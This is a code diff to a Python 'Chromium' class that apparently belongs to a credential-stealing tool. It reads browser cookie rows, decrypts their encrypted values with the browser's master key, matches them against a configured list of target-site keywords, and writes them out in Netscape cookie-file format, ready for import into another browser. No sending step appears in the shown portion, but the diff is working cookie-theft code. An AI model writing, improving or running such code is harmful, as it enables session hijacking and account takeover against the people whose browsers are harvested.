@@ -216,32 +216,25 @@ class Chromium:
         if not cookies_list:
             return
 
-        results = [
-            {
-                "creation_utc": result[0],
-                "top_frame_site_key": result[1],
-                "host_key": result[2],
-                "name": result[3],
-                "value": result[4],
-                "encrypted_value": self._decrypt(result[5], self.__master_key),
-                "path": result[6],
-                "expires_utc": result[7],
-                "is_secure": result[8],
-                "is_httponly": result[9],
-                "last_access_utc": result[10],
-                "has_expires": result[11],
-                "is_persistent": result[12],
-                "priority": result[13],
-                "samesite": result[14],
-                "source_scheme": result[15],
-                "source_port": result[16],
-                "is_same_party": result[17],
-            }
-            for result in cookies_list
-        ]
+        cookies_list_filtered = [row for row in cookies_list if row[0] != ""]
+        words = []
 
-        with open(path.join(self.__path, rf"{profile} Cookies.json"), "a", encoding="utf-8") as cookies:
-            dump(results, cookies)
+        temp = []
+
+        for row in cookies_list_filtered:
+
+            for keyword in self.__config.CookiesKeywords:
+
+                if "https" in keyword:
+                    keyword = keyword.split("[")[1].split("]")[0]
+
+                if keyword in row[0] and keyword not in words:
+                    words.append(keyword)
+
+            temp.append(f"{row[0]}\tTRUE\t/\tFALSE\t2538097566\t{row[1]}\t{ self._decrypt(row[2], self.__master_key)}")
+
+        with open(path.join(self.__path, rf"{profile} Cookies.txt"), "a", encoding="utf-8") as cookies:
+            cookies.write("\n".join(row for row in temp))
 
         cookies.close()
 
